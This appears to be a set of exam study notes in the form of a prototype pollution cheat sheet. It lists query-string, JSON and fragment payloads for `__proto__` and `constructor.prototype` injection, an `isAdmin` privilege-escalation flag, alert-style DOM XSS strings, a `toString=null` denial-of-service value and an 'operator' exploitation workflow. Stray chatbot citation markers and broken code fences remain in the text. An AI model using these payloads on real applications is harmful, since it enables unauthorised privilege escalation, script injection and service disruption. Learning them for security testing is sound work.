

---

``md
> [!ABSTRACT]
> Prototype Pollution is a JavaScript vulnerability where an attacker can **modify the prototype of objects**, affecting all objects in the application. :contentReference[oaicite:0]{index=0}  
> 
> Because JavaScript objects inherit from a shared prototype (`Object.prototype`), adding properties there means **every object gets polluted**. :contentReference[oaicite:1]{index=1}  
> 
> It happens when:
> - User input is merged into objects (e.g., JSON, query params)  
> - Keys like `__proto__`, `constructor`, or `prototype` are not sanitized  
> 
> Impact:
> - DOM XSS (client-side)  
> - Privilege escalation (`isAdmin=true`)  
> - Remote Code Execution (server-side in some cases) :contentReference[oaicite:2]{index=2}  
> 
> 🧠 Think: “You’re changing the default behavior of ALL objects”

---

## 🧠 Prototype Pollution – Cheat Sheet

---

### 🎯 1. Basic Detection (Prototype Injection)

> [!CHECK]
> Try injecting into `__proto__` via input  

```bash
?__proto__[test]=123
````

---

### 🧪 2. Confirm Pollution

> [!CHECK]  
> Check if property exists globally

```javascript
{}.test
```

---

### 🧬 3. Basic Payload

> [!SUCCESS]  
> Add arbitrary property

```bash
?__proto__[isAdmin]=true
```

---

### 🧩 4. JSON-Based Injection

> [!SUCCESS]  
> Works in APIs accepting JSON

```json
{"__proto__":{"isAdmin":true}}
```

---

### 🧪 5. Constructor Prototype Bypass

> [!ATTENTION]  
> Alternative injection path

```bash
?constructor[prototype][isAdmin]=true
```

---

### 💥 6. DOM XSS via Pollution

> [!SUCCESS]  
> Inject payload used in DOM sink

```bash
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
```

---

### ⚙️ 7. Privilege Escalation

> [!SUCCESS]  
> Modify logic flags

```bash
?__proto__[isAdmin]=true
```

---

### 🧪 8. Denial of Service (DoS)

> [!DANGER]  
> Break app behavior

```bash
?__proto__[toString]=null
```

---

### 💣 9. Gadget-Based Exploitation

> [!ATTENTION]  
> Pollution needs a “gadget” (code that uses polluted property)

```bash
?__proto__[payload]=<script>alert(1)</script>
```

---

### 🧪 10. URL Fragment Injection

> [!ATTENTION]  
> Works in client-side apps

```bash
#__proto__[test]=123
```

---

### 🔍 11. Real Workflow (Operator Method)

> [!SUCCESS]

1. Find input source:
    

```bash
?q=test
```

2. Inject pollution:
    

```bash
?__proto__[isAdmin]=true
```

3. Verify:
    

```javascript
{}.isAdmin
```

4. Find gadget:
    

- DOM sink (`innerHTML`)
    
- Logic check (`if isAdmin`)
    

5. Exploit → XSS / privilege escalation
    

---

### 🧠 12. Where to Test

> [!ABSTRACT]

- URL query parameters
    
- JSON API inputs
    
- Web messages
    
- Client-side JavaScript apps
    

---

## 🔥 Minimal Payload Set (EXAM USE)

> [!SUCCESS]  
> If you remember nothing else

```bash
?__proto__[isAdmin]=true
?constructor[prototype][isAdmin]=true
{"__proto__":{"isAdmin":true}}
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
```

---

## ⚠️ Operator Notes

> [!FAILURE]  
> If nothing happens:
> 
> - Keys sanitized (`__proto__` blocked)
>     
> - Safe merge functions used
>     
> - No exploitable gadget
>     

---

> [!ATTENTION]  
> Prototype Pollution requires:
> 
> - Source → input you control
>     
> - Pollution → modifying prototype
>     
> - Gadget → code that uses polluted value
>     
> 
> No gadget → no exploit

---

```

---

## 🔥 Key Insight (VERY IMPORTANT)

- Prototype Pollution is:
  - ❌ Not always directly exploitable  
  - ✅ A **“setup vulnerability”**  
- Real power comes from:
  👉 **chaining with XSS / logic bugs**

---

::contentReference[oaicite:3]{index=3}
```


>[!NOTE] if __proto__ dont work for server side pollution wrap it in constructor and change it to prototype
>e..g "constructor":{
>"prototype":{"isAdmin":true}}



